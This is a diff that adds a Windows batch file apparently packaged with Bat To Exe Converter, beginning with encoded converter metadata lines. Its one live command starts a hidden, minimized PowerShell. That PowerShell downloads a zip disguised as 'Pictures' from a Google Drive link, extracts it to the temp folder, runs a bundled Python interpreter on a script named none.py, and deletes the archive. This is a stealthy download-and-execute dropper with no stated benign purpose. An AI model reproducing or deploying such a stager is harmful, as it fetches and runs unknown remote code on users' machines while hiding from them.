@@ -1,0 +1,40 @@
+ÿþ&cls
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFBpQQQ2MAE+/Fb4I5/jHwuuUtkgPaM8+a5veyIi6CMRd713hFQ==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+ÿþ&cls
+@echo off
+
+start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://drive.usercontent.google.com/download?id=1o8mHbXWwE4v8drpclujH0H1TV30p46JJ&export=download&authuser=0&confirm=t&uuid=14272e7d-bbb9-44ae-bc60-3073c45074e5&at=AAINaII2D6KrojNSkbmfvFAY4aSi:1780818136202', \"$env:TEMP\Pictures.zip\"); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\Pictures.zip\", \"$env:TEMP\Pictures\"); Start-Sleep -Seconds 1; & \"$env:TEMP\Pictures\python.exe\" \"$env:TEMP\Pictures\none.py\"; del \"$env:TEMP\Pictures.zip\""
+
+exit
